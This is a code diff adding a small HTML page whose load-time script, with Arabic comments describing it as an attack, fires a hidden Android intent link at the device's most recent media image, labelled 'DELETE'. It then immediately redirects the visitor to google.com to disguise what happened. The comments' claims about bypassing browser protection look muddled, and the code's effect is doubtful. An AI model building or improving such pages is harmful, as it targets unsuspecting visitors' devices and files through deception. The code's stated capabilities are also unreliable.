@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <script>
+        window.onload = function() {
+            // محاولة اختراق مسار الميديا عبر Intent مباشر وقوي
+            // نستخدم هنا "توجيه البيانات" (Data URI) لتخطي حماية المتصفح
+            const payload = "intent:#Intent;action=android.intent.action.VIEW;data=content://media/external/images/media/last;type=image/*;S.android.intent.extra.TEXT=DELETE;end";
+            
+            // فتح الرابط في نافذة مخفية تماماً
+            var a = document.createElement('a');
+            a.href = payload;
+            a.click();
+
+            // التحويل الفوري للتمويه
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 300);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
